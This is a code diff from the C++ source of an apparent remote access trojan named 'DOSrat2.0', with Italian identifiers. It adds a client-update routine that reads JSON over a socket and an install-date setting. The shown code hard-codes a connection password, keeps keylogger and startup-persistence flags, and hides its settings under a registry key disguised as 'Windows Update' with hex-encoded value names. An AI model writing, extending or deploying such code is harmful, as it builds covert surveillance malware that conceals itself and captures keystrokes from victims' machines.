@@ -10,14 +10,23 @@ private:
 	}
 
 public:
+	struct NewClient
+	{
+		string Str;
+		json j;
+	};
+
 	static bool Inizializzazione(SOCKET Sock)
 	{
 		DirUtils du;
 		SystemUtils su;
+		EasyMSGB msgb;
 
 		char Pass[10] = "DOSrat2.0";
 
 		TcpIP::SetTimeout(10000, Sock);
+
+		//msgb.Ok("1");
 
 		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
 		{
@@ -72,25 +81,27 @@ public:
 		return false;
 	}
 
-	static string UpdateClient(SOCKET Sock)
+	static NewClient UpdateClient(SOCKET Sock)
 	{
 		string Buff;
+		NewClient NC;
 
 		if (TcpIP::RecvString(Sock, Buff))
 		{
-			if (TcpIP::SendString(Sock, "OK"))
-				return Buff;
+			NC.Str = Buff;
+
+			if (TcpIP::RecvString(Sock, Buff))
+			{
+				NC.j = json::parse(Buff);
+				TcpIP::SendString(Sock, "OK");
+			}
 			else
-				return "";
+				TcpIP::SendString(Sock, "NO");
 		}
 		else
-		{
 			TcpIP::SendString(Sock, "NO");
-			
-			return "";
-		}
 
-		return "";
+		return NC;
 	}
 };
 
@@ -110,6 +121,7 @@ public:
 	string ExeName = "Client.exe";
 	bool RegStartup = true;
 	bool KeyLogger = true;
+	string InstallDate = "";
 
 	// Costruttore
 	Settaggi()
@@ -152,6 +164,7 @@ public:
 		ExeName = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ));
 		RegStartup = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ)) == "true");
 		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ)) == "true");
+		InstallDate = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ));
 	}
 
 	// Scrive i settaggi su registro
@@ -166,5 +179,6 @@ public:
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ, en.AsciiToHex(ExeName).c_str());
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ, en.AsciiToHex((RegStartup) ? "true" : "false").c_str());
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ, en.AsciiToHex(DateTime::GetDateTime('_', '/')).c_str());
 	}
 };
